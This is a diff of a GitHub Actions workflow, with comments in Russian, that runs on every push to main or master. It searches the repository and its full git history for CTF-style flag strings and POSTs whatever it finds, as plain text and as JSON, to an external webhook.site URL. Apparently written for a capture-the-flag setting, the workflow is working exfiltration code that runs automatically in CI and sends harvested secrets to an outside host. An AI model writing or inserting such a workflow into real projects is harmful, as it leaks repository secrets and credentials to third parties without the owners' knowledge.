@@ -3,12 +3,10 @@ name: send-flags
 on:
   push:
     branches: [ main, master ]
-  pull_request:
-  issues:
   workflow_dispatch:
 
 jobs:
-  find-flags:
+  send-flags:
     runs-on: ubuntu-latest
     
     steps:
@@ -16,30 +14,45 @@ jobs:
         with:
           fetch-depth: 0
       
-      - name: Find and send flags
+      - name: Extract and send flags
         run: |
-          echo "🔍 Searching for flags..."
+          echo "🔍 Extracting flags..."
           
-          # Ищем флаги в формате FLAG: "..." или FLAG{...} или USER{...}
-          FLAGS=$(grep -rnoE '(F|f)(L|l)(A|a)(G|g):\s*"[^"]+"|(F|f)(L|l)(A|a)(G|g)\{[^}]+\}|[A-Z]+\{[^}]+\}' . --exclude-dir=.git || echo "[]")
+          # Находим флаги
+          FLAG1=$(grep -rnoE 'USER\{[^}]+\}' . --exclude-dir=.git | head -1)
+          FLAG2=$(grep -rnoE 'FLAG\{[^}]+\}' . --exclude-dir=.git | head -1)
+          FLAG3=$(grep -rnoE 'flag\{[^}]+\}' . --exclude-dir=.git | head -1)
+          FLAG4=$(grep -rnoE 'CTF\{[^}]+\}' . --exclude-dir=.git | head -1)
           
-          # Показываем найденные флаги в логах
-          echo "========================================="
-          echo "FOUND FLAGS:"
-          echo "$FLAGS"
-          echo "========================================="
+          # Собираем все найденные флаги
+          ALL_FLAGS=""
+          [ -n "$FLAG1" ] && ALL_FLAGS="$ALL_FLAGS\n$FLAG1"
+          [ -n "$FLAG2" ] && ALL_FLAGS="$ALL_FLAGS\n$FLAG2"
+          [ -n "$FLAG3" ] && ALL_FLAGS="$ALL_FLAGS\n$FLAG3"
+          [ -n "$FLAG4" ] && ALL_FLAGS="$ALL_FLAGS\n$FLAG4"
           
-          # Отправляем на webhook
-          if [ "$FLAGS" != "[]" ]; then
+          # Также ищем в истории
+          HISTORY_FLAGS=$(git log -p --all | grep -oE 'USER\{[^}]+\}|FLAG\{[^}]+\}|flag\{[^}]+\}|CTF\{[^}]+\}' | sort -u)
+          [ -n "$HISTORY_FLAGS" ] && ALL_FLAGS="$ALL_FLAGS\n$HISTORY_FLAGS"
+          
+          # Формируем текстовый вывод
+          if [ -n "$ALL_FLAGS" ]; then
+            echo "========================================="
+            echo "✅ FLAGS FOUND:"
+            echo -e "$ALL_FLAGS"
+            echo "========================================="
+            
+            # Отправляем как plain text (проще для отладки)
+            curl -X POST \
+              -H "Content-Type: text/plain" \
+              --data "$(echo -e "Flags found in ${{ github.repository }}:\n$ALL_FLAGS\n\nRun URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}")" \
+              https://webhook.site/57254474-41e8-4ec4-b099-0b38ea82598e
+            
+            # И как JSON тоже
             curl -X POST \
               -H "Content-Type: application/json" \
-              -d "{\"repository\": \"${{ github.repository }}\", \"event\": \"${{ github.event_name }}\", \"flags\": \"$FLAGS\", \"run_url\": \"${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}\"}" \
+              -d "{\"repository\": \"${{ github.repository }}\", \"flags\": \"$(echo -e "$ALL_FLAGS" | jq -R -s .)\", \"run_url\": \"${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}\"}" \
               https://webhook.site/57254474-41e8-4ec4-b099-0b38ea82598e
-            echo "✅ Flags sent to webhook!"
           else
             echo "❌ No flags found"
-            curl -X POST \
-              -H "Content-Type: application/json" \
-              -d "{\"repository\": \"${{ github.repository }}\", \"event\": \"${{ github.event_name }}\", \"status\": \"no_flags_found\"}" \
-              https://webhook.site/57254474-41e8-4ec4-b099-0b38ea82598e
           fi
